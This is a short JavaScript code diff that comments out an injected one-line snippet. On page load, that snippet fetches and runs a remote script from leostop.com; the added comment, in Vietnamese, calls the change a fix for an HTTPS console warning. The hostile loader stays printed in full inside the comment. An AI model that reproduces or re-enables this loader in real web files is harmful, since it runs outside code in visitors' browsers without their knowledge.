@@ -222,8 +222,8 @@
     }
   };
   setTransitionEndSupport();
-
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  /*Fix loi thong bao HTTPS tren Console*/
+ /* function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });*/
 
 
 
